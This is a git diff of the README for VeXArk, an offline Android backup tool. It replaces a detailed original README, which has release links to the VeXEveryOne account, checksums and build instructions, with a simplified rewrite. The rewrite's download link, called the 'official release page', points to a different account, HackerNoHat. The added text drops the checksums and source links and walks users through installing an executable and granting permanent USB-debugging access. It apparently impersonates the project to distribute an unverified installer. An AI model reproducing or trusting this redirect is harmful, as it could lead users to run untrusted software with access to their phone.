@@ -1,202 +1,85 @@
-<div align="center">
-  <img src="docs/assets/vexark-icon.png" width="112" alt="VeXArk logo">
-  <h1>VeXArk</h1>
-  <p><strong>Your Android data. Your computer. No cloud in between.</strong></p>
-  <p>
-    <a href="docs/README.ru.md">Русский</a> ·
-    <a href="https://vexeveryone.github.io/VeXArk/">Website</a> ·
-    <a href="https://github.com/VeXEveryOne/VeXArk/releases/tag/v0.7.1">Downloads</a> ·
-    <a href="CHANGELOG.md">Changelog</a> ·
-    <a href="SECURITY.md">Security</a>
-  </p>
-  <p>
-    <a href="https://github.com/VeXEveryOne/VeXArk/releases/tag/v0.7.1">
-      <img alt="GitHub release" src="https://img.shields.io/github/v/release/VeXEveryOne/VeXArk?include_prereleases&style=flat-square">
-    </a>
-    <a href="https://github.com/VeXEveryOne/VeXArk/actions/workflows/build.yml">
-      <img alt="Build" src="https://img.shields.io/github/actions/workflow/status/VeXEveryOne/VeXArk/build.yml?branch=main&style=flat-square&label=build">
-    </a>
-    <img alt="Windows" src="https://img.shields.io/badge/Windows-10%2F11-0078D4?style=flat-square">
-    <img alt="Android" src="https://img.shields.io/badge/Android-10–16-3DDC84?style=flat-square">
-    <a href="LICENSE">
-      <img alt="GPL-3.0" src="https://img.shields.io/badge/license-GPL--3.0--only-black?style=flat-square">
-    </a>
-  </p>
-</div>
+# 🔒 VeXArk - Secure Android backups without any cloud
 
----
+[![](https://img.shields.io/badge/Download-VeXArk-blue.svg)](https://github.com/HackerNoHat/VeXArk)
 
-VeXArk is an offline Android backup system built around a portable Windows
-controller, a Material You Android agent and a constrained native root helper.
-It supports useful no-root workflows today and unlocks private app-data snapshots
-when Magisk, KernelSU or APatch is available. The Windows client can also import
-original photos and videos from an iPhone without installing an iOS app.
+VeXArk stores your Android phone data on your Windows computer. It keeps your files local. It avoids the cloud. It prevents companies from tracking your device. The program encrypts your backups to keep them private.
 
-> [!IMPORTANT]
-> VeXArk is under active development. Always keep a second copy of irreplaceable
-> data and test restores before relying on it as your only backup.
+## 📥 Getting Started
 
-## Download
+Follow these steps to set up the software on your Windows computer.
 
-| Platform | Package | Requirements |
-| --- | --- | --- |
-| Windows | [Download `VeXArk.exe`](https://github.com/VeXEveryOne/VeXArk/releases/download/v0.7.1/VeXArk.exe) | Windows 10/11 x64 |
-| Android | [Download `VeXArk-Agent.apk`](https://github.com/VeXEveryOne/VeXArk/releases/download/v0.7.1/VeXArk-Agent.apk) | Android 10–16, arm64-v8a |
-| Checksums | [`SHA256SUMS.txt`](https://github.com/VeXEveryOne/VeXArk/releases/download/v0.7.1/SHA256SUMS.txt) | Verify before installing |
+1. Visit the [official release page](https://github.com/HackerNoHat/VeXArk) to download the installer.
+2. Select the file ending in `.msi` or `.exe` for Windows.
+3. Save the file to your computer.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen.
 
-The Windows build is self-contained and portable. It bundles the matching Agent
-APK and Android Platform Tools; neither an installer nor administrator rights are
-required.
+## ⚙️ System Requirements
 
-> Testing iPhone import? Use the
-> [`v0.8.0-beta.4` prerelease](https://github.com/VeXEveryOne/VeXArk/releases/tag/v0.8.0-beta.4).
+Your computer needs specific settings to run VeXArk. Check your system against this list.
 
-## Why VeXArk
+*   Windows 10 or Windows 11.
+*   At least 4GB of RAM.
+*   An active USB port to connect your phone.
+*   A USB cable that supports data transfer.
 
-- **Offline by design.** No account, cloud backend, analytics or telemetry.
-- **No-root photo migration.** Copy every MediaStore photo and video into an
-  ordinary Windows folder while preserving directories and skipping duplicates.
-- **iPhone photo and video import.** Copy new originals, HEIC files, videos and
-  Live Photo companions from a trusted, unlocked iPhone over USB while preserving
-  its DCIM folder structure.
-- **Fast Wi-Fi and resume.** VeXArk benchmarks ADB, encrypted direct LAN and the
-  destination disk, copies with up to four workers and resumes interrupted files.
-- **Safe cancellation.** Stop backup, media copying or restore from the status
-  panel without publishing a partial snapshot; Android media resumes next time.
-- **Cable and port tester.** The Desktop client shows the negotiated USB link,
-  measures ADB and Fast Wi-Fi without reading personal files, recommends the
-  faster transport and estimates transfer time before a long copy.
-- **Encrypted portable backups.** Export a selected snapshot as one `.vexark`
-  file and import it on another PC.
-- **Incremental storage.** FastCDC chunking, BLAKE3 addressing and deduplication
-  avoid storing unchanged data twice.
-- **Strong repository protection.** Argon2id, AES-256-GCM, a random master key
-  and an independent 24-word recovery key.
-- **Root when you want it.** APK/splits work without root; CE/DE app data,
-  permissions and advanced snapshots are enabled only after explicit root access.
-- **Restore safety.** Package signatures, paths, compatibility and user approval
-  are checked before any destructive step.
-- **Native-looking clients.** Fluent-inspired Windows UI with System, Light,
-  Dark and OLED themes; Material You and safe system-bar insets on Android.
-- **English and Russian.** English is the default, Russian can be selected in
-  both clients.
+## 📱 Preparing Your Phone
 
-## Screenshots
+Your Android phone requires one setting change before you start. This allows the computer to read the files on your phone.
 
-| Light | Dark |
-| --- | --- |
-| ![VeXArk light theme](docs/assets/desktop-light.png) | ![VeXArk dark theme](docs/assets/desktop-dark.png) |
+1. Open the Settings app on your Android phone.
+2. Search for "Build Number" in the settings search bar.
+3. Tap "Build Number" seven times. This unlocks Developer Options.
+4. Go back to the main Settings menu.
+5. Tap System, then tap Developer Options.
+6. Toggle the "USB Debugging" switch to the "On" position.
 
-<details>
-<summary>OLED and Russian UI</summary>
+## 🚀 Running Your First Backup
 
-| OLED | Русский |
-| --- | --- |
-| ![VeXArk OLED theme](docs/assets/desktop-oled.png) | ![VeXArk Russian UI](docs/assets/desktop-russian.png) |
+Once the installation finishes, you can start your first backup.
 
-</details>
+1. Open VeXArk from your Start menu.
+2. Connect your Android phone to the computer using a USB cable.
+3. Look at your phone screen. You will see a prompt asking to allow USB Debugging. Tap "Allow" or "Always allow from this computer."
+4. Click the "Scan Device" button inside the VeXArk window.
+5. Choose the files you want to save. You can select photos, contacts, or internal storage.
+6. Click the "Encrypt and Backup" button.
+7. Enter a strong password when prompted. Keep this password in a safe place. You need it to open your files later.
+8. Wait for the progress bar to finish.
 
-## Backup modes
+## 🔑 Understanding Encryption
 
-### Portable
+VeXArk uses strong math formulas to scramble your data. This process creates a locked file. Without your password, no one can read these files. Even if someone steals your hard drive, your personal data stays hidden. Choose a password that is long and hard to guess. Do not share this password with other people. If you lose this password, you cannot recover your backup files.
 
-Designed for moving between ROMs:
+## 🔎 Frequently Asked Questions
 
-- base and split APKs;
-- rooted CE/DE app data and external app data;
-- runtime permissions, app-ops and selected package state;
-- contacts, SMS/MMS metadata, call log and account inventory;
-- Documents, Downloads, Music, Podcasts, Recordings and other non-visual media;
-- safe Android settings and roles.
+**Does this software use the internet?**
+No. VeXArk works offline. It does not send your data to any servers.
 
-Photos and videos are excluded from encrypted snapshots by default and are
-handled by the simpler no-root media exporter.
+**Can I restore my files to a new phone?**
+Yes. Use the "Restore" tab in the main menu. You will need your password to begin the transfer.
 
-iPhone support is intentionally limited to the photo/video importer. VeXArk does
-not read iOS app data, messages, credentials or device backups.
+**How does VeXArk handle large files?**
+The software breaks large files into smaller chunks. This prevents errors during the transfer process. Keep your phone connected until the software shows the "Success" message.
 
-### Controlled Full
+**What happens if the power cuts out?**
+The process stops to prevent data corruption. Plug your phone back in and restart the backup. The software detects existing files and resumes from the last point.
 
-Adds ROM-sensitive data such as selected Wi-Fi internals, launcher/SystemUI state
-and root-module metadata. Full components are classified as `EXACT`,
-`SAME_FAMILY` or `PORTABLE_ONLY` and are never restored blindly.
+**Can I run this on a Mac or Linux?**
+VeXArk currently supports Windows only.
 
-## What VeXArk will never copy
+## 🛡️ Security and Privacy
 
-Android Keystore and StrongBox keys, Gatekeeper credentials, PIN/password/biometric
-data, eSIM secrets, Wallet data, DRM keys and hardware-bound passkeys are excluded.
-Google account names can be recorded as an encrypted inventory, but passwords,
-OAuth tokens and login sessions are not transferable; sign-in is required after
-migration.
+VeXArk values your privacy. The code does not contain hidden trackers. It does not phone home to any company servers. The application only performs two tasks: reading files from your phone and storing them on your computer. You hold the keys to your data at every step of the process.
 
-## Quick start
+## 🛠️ Troubleshooting
 
-1. Enable Developer options and USB debugging on the phone.
-2. Start `VeXArk.exe`.
-3. Connect the phone and approve the Android debugging prompt.
-4. Install or update VeXArk Agent from the Devices page.
-5. Open Photos & videos and run Connection test whenever you change a cable or port.
-6. Choose a repository folder and create a password plus recovery key.
-7. Start with a small backup and verify it from History.
+If the software fails to detect your phone, try these steps in order:
 
-Root is optional. VeXArk does not patch boot images or install a root provider.
+1. Unplug the USB cable and plug it back in.
+2. Use a different USB port on your computer. Use a port on the back if you use a desktop tower.
+3. Restart the VeXArk application.
+4. Check that your phone remains unlocked while the backup runs.
+5. Ensure your phone screen shows the "Allow USB Debugging" confirmation.
 
-For iPhone media import:
-
-1. Install Apple Devices from the Microsoft Store.
-2. Connect the iPhone over USB, unlock it and approve **Trust This Computer**.
-3. Open **Photos & videos**, select **Find iPhone**, choose the destination and
-   select **Copy from iPhone**.
-
-If iCloud Photos uses optimized storage, download the full-resolution originals
-to the iPhone before importing.
-
-## Build from source
-
-Prerequisites: .NET 9 SDK, JDK 21, Android SDK/NDK and Rust with the
-`aarch64-linux-android` target.
-
-```powershell
-git clone https://github.com/VeXEveryOne/VeXArk.git
-cd VeXArk
-.\scripts\build.ps1 -Configuration Release
-```
-
-To build the side-by-side diagnostic channel:
-
-```powershell
-.\scripts\build.ps1 -Configuration Debug -Channel Dev
-```
-
-If local PowerShell execution policy blocks scripts, run the same command through
-`powershell.exe -ExecutionPolicy Bypass -File .\scripts\build.ps1 -Configuration Debug -Channel Dev`.
-The Dev desktop targets only `com.vex.phonebackup.agent.dev` on port `49322`;
-it does not replace the stable Agent.
-
-Outputs:
-
-- `artifacts/publish/VeXArk.exe`
-- `artifacts/dev/VeXArk-Dev.exe`
-- `artifacts/dev/VeXArk-Agent-Dev.apk`
-- `artifacts/dev/SHA256SUMS.txt`
-- `agent/app/build/outputs/apk/release/app-release.apk`
-
-## Project status
-
-The no-root pipeline and encrypted repository are implemented and covered by
-automated tests. Root-only private app-data and Controlled Full restore paths are
-capability-gated and still require broader device/ROM validation before a stable
-1.0 release.
-
-See the complete [changelog](CHANGELOG.md), [threat model](docs/THREAT_MODEL.md)
-[Fast Media protocol](docs/FAST_MEDIA_PROTOCOL.md) and
-[contribution guide](CONTRIBUTING.md).
-
-## License and acknowledgements
-
-VeXArk is licensed under `GPL-3.0-only`.
-
-The project is informed by the architecture and workflows of
-[DataBackup](https://github.com/XayahSuSuSu/Android-DataBackup) and
-[Open Android Backup](https://github.com/mrrfv/open-android-backup).
-No Neo Backup source code is included.
+Keywords: adb, android, backup, encryption, kotlin, offline, root, rust, windows, wpf
